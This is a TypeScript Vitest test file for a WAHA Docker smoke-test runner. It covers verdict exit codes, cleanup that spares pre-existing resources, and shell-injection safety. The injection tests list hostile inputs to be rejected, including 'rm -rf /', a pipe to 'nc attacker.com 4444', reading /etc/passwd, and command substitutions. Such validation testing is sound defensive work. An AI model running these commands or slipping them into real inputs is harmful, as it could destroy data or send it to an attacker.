import * as fs from "node:fs";
import * as path from "node:path";
import { describe, it, expect, vi } from "vitest";
import { WahaSmokeRunner } from "../smoke-docker-waha";

describe("WAHA Smoke Runner Truthfulness & Robustness (CH-10)", () => {
  it("should verify smoke runner source code has ZERO inverted hasFailures assignments", () => {
    const filePath = path.resolve(__dirname, "../smoke-docker-waha.ts");
    const content = fs.readFileSync(filePath, "utf-8");

    // Must NOT have the inverted bug: `hasFailures = false` inside `if (r.status === "FAIL")`
    expect(content).not.toMatch(/if\s*\(\s*r\.status\s*===\s*["']FAIL["']\s*\)\s*hasFailures\s*=\s*false/);

    // Must correctly set hasFailures to true
    expect(content).toMatch(/if\s*\(\s*r\.status\s*===\s*["']FAIL["']\s*\)\s*\{\s*hasFailures\s*=\s*true/);

    // Must NOT import execSync from node:crypto
    expect(content).not.toMatch(/from\s+["']node:crypto["']/);
  });

  it("should enforce exitCode 1 whenever any step fails (anti false-pass guarantee)", () => {
    const runner = new WahaSmokeRunner({
      port: "3000",
      sessionName: "test-failure-session",
    });

    // Simulate 3 steps with 1 FAIL
    runner.results.push(
      { step: "1. Render compose", status: "PASS", details: "ok" },
      { step: "2. Start container", status: "FAIL", details: "Failed to boot" },
      { step: "3. Cleanup", status: "PASS", details: "Cleaned up" }
    );

    const verdict = runner.evaluateVerdict();
    expect(verdict.success).toBe(false);
    expect(verdict.exitCode).toBe(1);
  });

  it("should abort pipeline immediately if Step 4 fails and return exitCode 1", async () => {
    const runner = new WahaSmokeRunner({
      port: "3000",
      sessionName: "test-step4-fail",
    });

    // Mock runStep behavior
    const step1 = await runner.runStep("1. Render compose", async () => ({ status: "PASS", details: "ok" }));
    expect(step1).toBe(true);

    const step4 = await runner.runStep("4. Create lab session via REST API", async () => ({
      status: "FAIL",
      details: "HTTP 500 Internal Server Error",
    }));
    expect(step4).toBe(false);

    // Evaluate verdict after Step 4 failure
    const verdict = runner.evaluateVerdict();
    expect(verdict.success).toBe(false);
    expect(verdict.exitCode).toBe(1);

    // Steps 5, 6, 7 should not have executed
    const stepNames = runner.results.map((r) => r.step);
    expect(stepNames).not.toContain("5. Verify session listing");
    expect(stepNames).not.toContain("6. Restart container to test volume persistence");
    expect(stepNames).not.toContain("7. Verify structural persistence of session after restart");
  });

  it("should preserve pre-existing sessions and not delete them in cleanup", async () => {
    const runner = new WahaSmokeRunner({
      port: "3000",
      sessionName: "pre-existing-production-session",
    });

    // Mock fetch to report pre-existing session
    const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (url) => {
      const urlStr = String(url);
      if (urlStr.includes("/api/sessions?all=true")) {
        return new Response(JSON.stringify([{ name: "pre-existing-production-session", status: "WORKING" }]), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        });
      }
      return new Response("{}", { status: 200 });
    });

    try {
      const preExists = await runner.checkPreExistingSession();
      expect(preExists).toBe(true);

      // Attempt deletion: because it was NOT created by test, it MUST NOT make DELETE call
      fetchSpy.mockClear();
      const preserved = await runner.deleteSessionViaApi();
      expect(preserved.success).toBe(true);

      // Verify no DELETE request was dispatched
      const deleteCalls = fetchSpy.mock.calls.filter(([callUrl, opts]) => {
        return opts?.method === "DELETE";
      });
      expect(deleteCalls).toHaveLength(0);
    } finally {
      fetchSpy.mockRestore();
    }
  });

  it("should delete session via API when created by the test", async () => {
    const runner = new WahaSmokeRunner({
      port: "3000",
      sessionName: "ephemeral-test-session",
    });

    // Simulate session was created by test
    (runner as any).sessionCreatedByTest = true;

    const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (url, opts) => {
      const urlStr = String(url);
      if (opts?.method === "DELETE" && urlStr.includes("/api/sessions/ephemeral-test-session")) {
        return new Response("{}", { status: 200 });
      }
      return new Response("{}", { status: 200 });
    });

    try {
      const deleted = await runner.deleteSessionViaApi();
      expect(deleted.success).toBe(true);

      const deleteCalls = fetchSpy.mock.calls.filter(([callUrl, opts]) => {
        return opts?.method === "DELETE" && String(callUrl).includes("ephemeral-test-session");
      });
      expect(deleteCalls).toHaveLength(1);
    } finally {
      fetchSpy.mockRestore();
    }
  });

  it("should fail cleanup and produce exitCode 1 when session DELETE API returns error", async () => {
    const runner = new WahaSmokeRunner({
      port: "3000",
      sessionName: "failing-delete-session",
    });

    (runner as any).sessionCreatedByTest = true;

    // Mock fetch to simulate 500 error on DELETE and STOP
    const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
      return new Response(JSON.stringify({ message: "Internal server error deleting session" }), {
        status: 500,
        headers: { "Content-Type": "application/json" },
      });
    });

    try {
      const cleanup = await runner.cleanupContainer();
      expect(cleanup.success).toBe(false);
      expect(cleanup.errors.length).toBeGreaterThanOrEqual(1);
      expect(cleanup.errors[0]).toContain("Failed to delete session");

      // Verify Step 8 records failure
      await runner.runStep("8. Targeted cleanup of container and test session", async () => {
        if (!cleanup.success) {
          return {
            status: "FAIL",
            details: `Cleanup failed: ${cleanup.errors.join("; ")}`,
          };
        }
        return { status: "PASS", details: "ok" };
      });

      const verdict = runner.evaluateVerdict();
      expect(verdict.success).toBe(false);
      expect(verdict.exitCode).toBe(1);
    } finally {
      fetchSpy.mockRestore();
    }
  });

  it("should fail cleanup and produce exitCode 1 when docker stop fails", async () => {
    const mockExec = vi.fn().mockImplementation(async (cmd: string) => {
      if (cmd.includes("docker stop")) {
        throw new Error("Docker daemon communication error during stop");
      }
      return { stdout: "", stderr: "" };
    });

    const runner = new WahaSmokeRunner({
      port: "3000",
      sessionName: "stop-fail-session",
      execFn: mockExec,
    });

    (runner as any).containerStartedByTest = true;

    const cleanup = await runner.cleanupContainer();
    expect(cleanup.success).toBe(false);
    expect(cleanup.errors.some((e) => e.includes("Failed to stop container"))).toBe(true);

    const verdict = runner.evaluateVerdict();
    // Verify that failures in cleanup reflect in exitCode 1
    runner.results.push({
      step: "8. Targeted cleanup of container and test session",
      status: "FAIL",
      details: cleanup.errors.join("; "),
    });
    const finalVerdict = runner.evaluateVerdict();
    expect(finalVerdict.success).toBe(false);
    expect(finalVerdict.exitCode).toBe(1);
  });

  it("should fail cleanup and produce exitCode 1 when docker rm fails", async () => {
    const mockExec = vi.fn().mockImplementation(async (cmd: string) => {
      if (cmd.includes("docker rm")) {
        throw new Error("Container busy or locked by Docker daemon");
      }
      return { stdout: "", stderr: "" };
    });

    const runner = new WahaSmokeRunner({
      port: "3000",
      sessionName: "rm-fail-session",
      execFn: mockExec,
    });

    (runner as any).containerStartedByTest = true;

    const cleanup = await runner.cleanupContainer();
    expect(cleanup.success).toBe(false);
    expect(cleanup.errors.some((e) => e.includes("Failed to remove container"))).toBe(true);
  });

  it("should detect and preserve pre-existing container without stopping or removing it", async () => {
    const mockExec = vi.fn().mockImplementation(async (cmd: string) => {
      if (cmd.includes("docker ps -a")) {
        return { stdout: "sos-v3-waha\n", stderr: "" };
      }
      return { stdout: "", stderr: "" };
    });

    const runner = new WahaSmokeRunner({
      port: "3000",
      sessionName: "pre-existing-container-test",
      execFn: mockExec,
    });

    const preExists = await runner.checkPreExistingContainer();
    expect(preExists).toBe(true);

    // Run cleanupContainer: because container was NOT started by test, it MUST NOT invoke docker stop or docker rm
    mockExec.mockClear();
    const cleanup = await runner.cleanupContainer();
    expect(cleanup.success).toBe(true);
    expect(cleanup.preservedResources.some((r) => r.includes("sos-v3-waha"))).toBe(true);

    const stopOrRmCalls = mockExec.mock.calls.filter(([cmd]) => {
      return String(cmd).includes("docker stop") || String(cmd).includes("docker rm");
    });
    expect(stopOrRmCalls).toHaveLength(0);
  });

  describe("Command Injection Prevention & Strict Shell Safety (P0-1)", () => {
    it("should reject containerName containing shell injection characters ($(), backticks, quotes, semicolon)", () => {
      const maliciousNames = [
        "waha; rm -rf /",
        "waha$(whoami)",
        "waha`id`",
        'waha" && echo pwned',
        "waha' || reboot",
        "waha | nc attacker.com 4444",
        "waha\nmalicious",
      ];

      for (const name of maliciousNames) {
        expect(() => {
          new WahaSmokeRunner({ containerName: name });
        }).toThrow(/Security validation error/);
      }
    });

    it("should reject sessionName containing shell injection characters ($(), backticks, quotes, semicolon)", () => {
      const maliciousNames = [
        "session; cat /etc/passwd",
        "session$(cat secret)",
        "session`touch /tmp/pwn`",
        'session" && id',
        "session' || whoami",
        "session & ping -c 1 127.0.0.1",
        "session>file",
      ];

      for (const name of maliciousNames) {
        expect(() => {
          new WahaSmokeRunner({ sessionName: name });
        }).toThrow(/Security validation error/);
      }
    });

    it("should pass arguments strictly as argument array to execFile without shell interpretation", async () => {
      const recordedCalls: Array<{ file: string; args: readonly string[]; options?: any }> = [];
      const mockExecFile = vi.fn().mockImplementation(async (file: string, args: readonly string[], options?: any) => {
        recordedCalls.push({ file, args, options });
        if (args.includes("config")) {
          return { stdout: "services:\n  sos-v3-waha:\n", stderr: "" };
        }
        if (args.includes("info")) {
          return { stdout: "29.8.0\n", stderr: "" };
        }
        return { stdout: "", stderr: "" };
      });

      const runner = new WahaSmokeRunner({
        port: "3000",
        containerName: "safe-container-123",
        sessionName: "safe-session-456",
        apiKey: "secret'with\"quotes$and;semi",
        execFileFn: mockExecFile,
      });

      const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (url) => {
        const u = String(url);
        if (u.includes("/api/server/version")) {
          return new Response(JSON.stringify({ version: "2026.8.2" }), { status: 200 });
        }
        if (u.includes("/api/sessions?all=true")) {
          return new Response(JSON.stringify([{ name: "safe-session-456", status: "WORKING" }]), { status: 200 });
        }
        if (u.includes("/api/sessions/start")) {
          return new Response(JSON.stringify({ name: "safe-session-456", status: "STARTING" }), { status: 201 });
        }
        return new Response("{}", { status: 200 });
      });

      try {
        await runner.execute();

        // Verify all invocations used pure argument arrays
        expect(recordedCalls.length).toBeGreaterThan(0);
        for (const call of recordedCalls) {
          expect(call.file).toBe("docker");
          expect(Array.isArray(call.args)).toBe(true);
          // Ensure no shell wrapper string like `sh -c` was used
          expect(call.args).not.toContain("sh");
          expect(call.args).not.toContain("-c");
        }

        // Verify WAHA_API_KEY was passed exclusively via options.env, NOT in argument strings
        const composeCalls = recordedCalls.filter((c) => c.args.includes("compose"));
        for (const call of composeCalls) {
          expect(call.options?.env?.WAHA_API_KEY).toBe("secret'with\"quotes$and;semi");
          // Must NOT appear in argument strings
          for (const arg of call.args) {
            expect(arg).not.toContain("secret'with\"quotes$and;semi");
          }
        }
      } finally {
        fetchSpy.mockRestore();
      }
    });

    it("should URL-encode sessionName in REST API endpoints", async () => {
      const runner = new WahaSmokeRunner({
        port: "3000",
        sessionName: "test-session-encoded",
      });
      (runner as any).sessionCreatedByTest = true;

      const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (url) => {
        return new Response("{}", { status: 200 });
      });

      try {
        await runner.deleteSessionViaApi();
        expect(fetchSpy).toHaveBeenCalled();
        const callUrl = String(fetchSpy.mock.calls[0]![0]);
        expect(callUrl).toContain("/api/sessions/test-session-encoded");
      } finally {
        fetchSpy.mockRestore();
      }
    });
  });

  describe("Verdict Ordering & Distinct Exit Codes (P0-3)", () => {
    it("should enforce exitCode 2 for BLOCKED_EXTERNAL when no errors occurred", () => {
      const runner = new WahaSmokeRunner({
        port: "3000",
        sessionName: "blocked-test-session",
      });

      runner.results.push(
        { step: "1. Render compose", status: "PASS", details: "ok" },
        { step: "2. Start container", status: "BLOCKED_EXTERNAL", details: "Pre-existing container" },
        { step: "8. Cleanup", status: "PASS", details: "Cleaned up" }
      );

      const verdict = runner.evaluateVerdict();
      expect(verdict.success).toBe(false);
      expect(verdict.exitCode).toBe(2);
    });

    it("should enforce exitCode 1 if FAIL occurs, even when BLOCKED_EXTERNAL is also present", () => {
      const runner = new WahaSmokeRunner({
        port: "3000",
        sessionName: "mixed-status-session",
      });

      runner.results.push(
        { step: "1. Render compose", status: "PASS", details: "ok" },
        { step: "2. Start container", status: "BLOCKED_EXTERNAL", details: "Blocked" },
        { step: "8. Cleanup", status: "FAIL", details: "Cleanup crashed" }
      );

      const verdict = runner.evaluateVerdict();
      expect(verdict.success).toBe(false);
      expect(verdict.exitCode).toBe(1);
    });

    it("should ensure cleanup failure in Step 8 causes exitCode 1 even if pipeline aborted at Step 4", async () => {
      const mockExecFile = vi.fn().mockImplementation(async (file, args) => {
        if (args.includes("info")) return { stdout: "29.8.0\n", stderr: "" };
        if (args.includes("config")) return { stdout: "services:\n  sos-v3-waha:\n", stderr: "" };
        if (args.includes("stop")) throw new Error("Stop failed");
        return { stdout: "", stderr: "" };
      });

      const runner = new WahaSmokeRunner({
        port: "3000",
        sessionName: "abort-then-cleanup-fail",
        simulateFailureAtStep: 4,
        execFileFn: mockExecFile,
      });

      // Mock fetch
      const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
        return new Response(JSON.stringify({ version: "2026.8.2" }), { status: 200 });
      });

      try {
        const result = await runner.execute();
        // Step 4 failed AND Step 8 cleanup failed -> exitCode must be 1
        expect(result.exitCode).toBe(1);
        expect(result.success).toBe(false);

        // Step 8 must be present in the final results!
        const step8 = result.results.find((r) => r.step.startsWith("8."));
        expect(step8).toBeDefined();
        expect(step8?.status).toBe("FAIL");
      } finally {
        fetchSpy.mockRestore();
      }
    });
  });
});
